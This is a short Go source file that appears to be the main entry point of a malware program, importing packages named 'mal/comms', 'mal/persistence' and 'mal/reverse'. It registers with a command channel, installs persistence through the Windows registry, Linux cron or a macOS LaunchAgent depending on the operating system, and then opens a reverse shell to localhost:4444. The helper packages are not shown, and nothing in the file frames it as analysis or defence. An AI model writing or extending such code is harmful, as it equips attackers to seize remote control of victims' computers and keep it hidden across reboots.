package main

import (
	communications "mal/comms"
	"mal/persistence"
	"mal/reverse"
	"runtime"
)

var persistenceFuncs = map[string]func() error{
	"windows": persistence.AddToRegistry,
	"linux":   persistence.AddToCron,
	"darwin":  persistence.AddToLaunchAgent,
}

func main() {
	communications.Register()

	if f, ok := persistenceFuncs[runtime.GOOS]; ok {
		err := f()

		if err != nil {
			// handle the failure
		}
	}

	reverse.StartReverseShell("localhost:4444")
}
